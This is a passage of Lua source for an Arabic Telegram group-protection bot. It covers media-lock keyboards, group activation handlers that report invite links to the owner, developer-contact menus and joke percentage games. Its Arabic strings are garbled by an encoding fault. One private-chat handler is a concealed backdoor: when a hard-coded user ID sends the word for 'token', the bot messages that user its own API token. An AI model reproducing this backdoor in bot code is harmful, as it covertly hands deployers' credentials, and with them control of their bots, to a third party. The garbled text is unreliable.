{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/lockphoto"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/unlockphoto"},{text = 'ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockvoise"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockvoise"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/lockaudo"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/unlockaudo"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/lockfwd"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/unlockfwd"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockfile"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockfile"},{text = 'ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockphone"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockphone"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/lockposts"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/unlockposts"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/lockflood"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/unlockflood"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/lockfarse"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/unlockfarse"},{text = 'ΩΩΩ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/lockfshar"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/unlockfshar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/lockchat"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/unlockchat"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ' and Admin(msg) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΨΉΨ·ΩΩ ΩΨͺΩΨΉΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlock_links"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockrepall"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockrepall"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/lockide"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/unlockide"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/lockidephoto"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/unlockidephoto"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/lockkiked"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/unlockkiked"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/locksetm"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/unlocksetm"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/lockkikedme"},{text = 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/lockgames"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/unlockgames"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_..msg.sender_user_id_.."/lockrepgr"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_.."/unlockrepgr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end


end ---- Chat_Type = 'GroupBot' 
end ---- Chat_Type = 'GroupBot' 
if text == 'ΨͺΩΨΉΩΩ' then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !') 
return false 
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data) 
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSonic(msg) then
send(msg.chat_id_, msg.id_,'Ω­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ ΩΩ *~ {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'* ΨΉΨΆΩ')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat) 
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΩΨΉΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
Reply_Status(msg,result.id_,'reply_Add','Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil) 
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΨ© ΩΩΨͺΩ Ψ±ΩΨΉΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ ΨͺΨ±ΩΩΨ© { "..num2.." } ΩΩ Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end,nil) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Text = 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nΩ­ Ψ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nΩ­ Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nΩ­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ *~ '..NumMember..'*'..
'\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nΩ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
sendText(Id_Sudo,Text,0,'md')
end
end,nil) 
end,nil) 
end,nil)
end
-----by-7oda--
if Chat_Type == 'GroupBot' then
if text and not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then 
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat) 
Reply_Status(msg,result.id_,'reply_Add','Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ')
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,LinkGp) 
Text = 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nΩ­ Ψ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nΩ­ Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nΩ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
sendText(Id_Sudo,Text,0,'md')
end,nil)
end,nil)
end
end
-----------------
if text == 'ΨͺΨΉΨ·ΩΩ' and DevBot(msg) then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat) 
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΨΉΨ·ΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
Reply_Status(msg,result.id_,'reply_Add','Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
database:srem(bot_id..'Chek:Groups',msg.chat_id_) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,LinkGp) 

Text = 'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nΩ­ Ψ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nΩ­ Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nΩ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
sendText(Id_Sudo,Text,0,'md')
end
end,nil) 
end,nil) 
end
if text == 'Ψ§ΩΩΨ·ΩΨ±' or text == 'Ψ§ΩΨ―ΨΉΩ' or text == 'ΩΨ·ΩΨ±' then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΩ Ψ§ΩΨ¨ΩΨͺ ΩΨ΄Ψ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΨ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ―ΨΉΩ') 
return false 
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data) 
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSonic(msg) then
send(msg.chat_id_, msg.id_,'Ω­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ ΩΩ *~ {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'* ΨΉΨΆΩ')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Text = 'ΩΨ±Ψ­Ψ¨Ψ§ ΩΨ·ΩΨ±Ω ΩΩΨ§Ω Ψ΄Ψ?Ψ΅ ΩΨ­ΨͺΨ§Ψ¬ Ψ§ΩΩ ΩΨ³Ψ§ΨΉΨ―Ω\n'..
'\nΩ­ Ψ§Ψ³ΩΩ ~ '..Name..''..
'\nΩ­ Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nΩ­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ *~ '..NumMember..'*'..
'\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nΩ­ Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΨ© ~ ['..LinkGp..']'
sendText(Id_Sudo,Text,0,'md')
end,nil) 
end,nil) 
end,nil)
end
if text == 'ΨͺΩΨΉΩΩ' and not DevBot(msg) and not database:get(bot_id..'Free:Add:Bots') then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ') 
return false 
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'Ψ§ΩΩΩΨ΄Ψ¦'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'Ψ§ΩΨ§Ψ―ΩΩ'
else 
var= 'ΨΉΨΆΩ'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΩΨΉΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSonic(msg) then
send(msg.chat_id_, msg.id_,'Ω­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ ΩΩ *~ {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'* ΨΉΨΆΩ')
return false
end
Reply_Status(msg,result.id_,'reply_Add','Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil) 
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΨ© ΩΩΨͺΩ Ψ±ΩΨΉΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ ΨͺΨ±ΩΩΨ© { "..num2.." } ΩΩ Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end,nil) 
database:sadd(bot_id..'Basic:Creator'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Text = 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nΩ­ Ψ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nΩ­ ΩΩΩΨΉΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..AddPy..'' ..
'\nΩ­ Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nΩ­ ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ *~ '..NumMember..'*'..
'\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nΩ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
sendText(Id_Sudo,Text,0,'md')
end
end
end
end,nil) 
end,nil) 
end,nil) 
end,nil)
end
--------
if Chat_Type == 'UserBot' then
if text == 'ΨͺΩΩΩ' and  msg.sender_user_id_ == tonumber(1593178008) then
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendMessage?chat_id=1593178008&reply_to_message_id='..abc..'&text='..token..'') 
end
end
if Chat_Type == 'UserBot' then
if not Devss(msg) then
if text == '/start' then 
Namebot = (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±")
local Text =  'Ω­ ΩΨ±Ψ­Ψ¨Ψ§ Ψ§ΩΨ§ Ψ¨ΩΨͺ Ψ­ΩΨ§ΩΨ© Ψ¬Ψ±ΩΨ¨Ψ§Ψͺ Ψ§Ψ³ΩΩ ['..Namebot..']\nΩ­ ΩΨΆΩΩΨͺΩ Ψ­ΩΨ§ΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ³Ψ¨Ψ§Ω ΩΨ§ΩΨͺΩΩΩΨ΄ ΩΨ§ΩΨ?...\nΩ­ ΩΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΨΆΩΩΩ Ψ§ΩΩ ΩΨ¬ΩΩΨΉΨ§ΨͺΩ ΩΩ Ψ¨Ψ±ΩΨΉΩ ΩΨ΄Ψ±Ω Ψ«Ω Ψ§Ψ±Ψ³Ω ΨͺΩΨΉΩΩ \nΩ­ ΩΨΉΨ±Ω Ψ§ΩΩΨ·ΩΨ± ['..UserName..']'
local keyboard = {
{'ΩΨ­ΩΩΨ―','Ψ³ΩΩΩΩ'},
{'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³'},
{'Ψ§ΨΊΨ§ΩΩ','Ψ§ΩΩΨ§Ω'},
{'Ψ§ΩΨΉΨ§Ψ¨ Ψ§ΩΨ³ΩΨ±Ψ³'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
end
if text == 'Ψ§ΩΨΉΨ§Ψ¨ Ψ§ΩΨ³ΩΨ±Ψ³' then
local Text = 'Ψ§ΩΩΨ§ Ψ¨Ω ΩΩ Ψ§ΩΨΉΨ§Ψ¨ Ψ³ΩΨ±Ψ³ Ψ±ΩΩΩΨ±\nΨ§Ψ?ΨͺΨ§Ψ± Ψ§ΩΩΨΉΨ¨Ω ΩΩ Ψ§ΩΩΨ§Ψ¦ΩΩ'
local keyboard = {
{'Ψ΅Ψ±Ψ§Ψ­Ω','ΨͺΩΩΨͺ'},
{'Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬','Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±'},
{'ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ','ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨'},
{'ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ','ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«Ω','ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω'},
{'ΨΉΩΨ―Ω'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
end
--------
if text == 'ΩΨ­ΩΩΨ―' then 
local Text = [[ 
DEV MAHMOUD β
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§ βοΈ', url="t.me/MahmoudM2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'Ψ³ΩΩΩΩ' then 
local Text = [[ 
DEV SONIC β
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'SONIC βοΈ', url="t.me/uu_iv"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³' then 
local Text = [[ 
Source channel
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'REVOR SOURCEοΈ', url="t.me/revorb0t"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" or text == "ΩΨ³Ψ¨Ω Ψ­Ψ¨" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³ΩΩ ΩΨ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ«Ψ§ΩΩΨ  \n ΩΨ«Ψ§Ω Ψ§Ψ³Ψ― Ω ΩΨ¨ΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'ΩΨ³Ψ¨Ω Ψ­Ψ¨ '..text..' ΩΩ : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" or text == "ΩΨ³Ψ¨Ω ΩΨ±Ω" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
